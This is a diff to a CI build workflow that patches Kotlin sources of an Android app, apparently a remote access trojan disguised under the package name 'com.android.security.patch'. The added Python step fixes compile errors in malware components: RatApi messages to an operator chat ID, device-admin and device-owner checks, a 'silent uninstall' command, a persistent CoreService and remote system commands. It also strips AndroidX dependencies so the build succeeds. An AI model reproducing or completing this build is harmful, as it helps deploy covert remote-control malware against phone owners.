@@ -64,6 +64,79 @@ jobs:
           cp -f android_override/app/src/main/res/xml/* android/app/src/main/res/xml/
           cp -f android_override/app/src/main/res/values/* android/app/src/main/res/values/
 
+      - name: Fix Kotlin sources
+        run: |
+          cd /tmp/flutter_src
+          python3 - <<'PYEOF'
+          import os
+          base = "android/app/src/main/kotlin/com/android/security/patch"
+          def read(p):
+              with open(p) as f: return f.read()
+          def write(p, s):
+              with open(p, "w") as f: f.write(s)
+          def patch(p, old, new):
+              s = read(p)
+              if old not in s:
+                  print(f"[WARN] not found in {p}: {old[:50]!r}")
+                  return
+              write(p, s.replace(old, new))
+              print(f"[OK] {p}")
+
+          # WebViewActivity: framework Activity instead of AppCompatActivity
+          p = f"{base}/WebViewActivity.kt"
+          patch(p, "import androidx.appcompat.app.AppCompatActivity", "import android.app.Activity")
+          patch(p, "class WebViewActivity : AppCompatActivity()", "class WebViewActivity : Activity()")
+
+          # CoreService: framework Notification + Rules import
+          p = f"{base}/CoreService.kt"
+          patch(p, "import androidx.core.app.NotificationCompat\n", "")
+          patch(p, "NotificationCompat.Builder", "Notification.Builder")
+          patch(p, "NotificationCompat.PRIORITY_MIN", "Notification.PRIORITY_MIN")
+          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")
+
+          # AdminReceiver: Rules import
+          p = f"{base}/AdminReceiver.kt"
+          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")
+
+          # Navigate: framework Notification
+          p = f"{base}/commands/Navigate.kt"
+          patch(p, "import androidx.core.app.NotificationCompat\n", "")
+          patch(p, "NotificationCompat.Builder", "Notification.Builder")
+          patch(p, "NotificationCompat.PRIORITY_HIGH", "Notification.PRIORITY_HIGH")
+          patch(p, ".setStyle(NotificationCompat.BigTextStyle().bigText(body))\n", "")
+
+          # HangManager: remove broken line
+          p = f"{base}/HangManager.kt"
+          patch(p, "        val custom = Prefs.getStr(null) // no-op, placeholder\n", "")
+
+          # Apps: replace deletePackage with uninstall intent
+          p = f"{base}/commands/Apps.kt"
+          old = """if (AdminReceiver.isDeviceOwner(ctx)) {
+                      dpm.deletePackage(AdminReceiver.component(ctx), pkg, null)
+                      RatApi.sendMessage(ctx, "silent uninstall: $pkg", chatId)
+                  } else {
+                      val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
+                          .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                      ctx.startActivity(i)
+                      RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
+                  }"""
+          new = """val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
+                      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                  ctx.startActivity(i)
+                  RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)"""
+          patch(p, old, new)
+
+          # SystemCmd: setBitmap instead of setInputStream
+          p = f"{base}/commands/SystemCmd.kt"
+          old = """val fis = File(path).inputStream()
+              fis.use { wm.setInputStream(it) }"""
+          new = """val bmp = android.graphics.BitmapFactory.decodeFile(path)
+              if (bmp != null) wm.setBitmap(bmp)"""
+          patch(p, old, new)
+
+          print("=== all patches applied ===")
+          PYEOF
+
       - name: Configure build.gradle
         run: |
           cd /tmp/flutter_src
@@ -82,9 +155,6 @@ jobs:
           anchor = "dependencies {"
           inject = anchor + """
               implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
-              implementation 'androidx.appcompat:appcompat:1.6.1'
-              implementation 'androidx.core:core-ktx:1.12.0'
-              implementation 'androidx.activity:activity-ktx:1.8.2'
           """
           s = s.replace(anchor, inject, 1)
           open(p, "w").write(s)
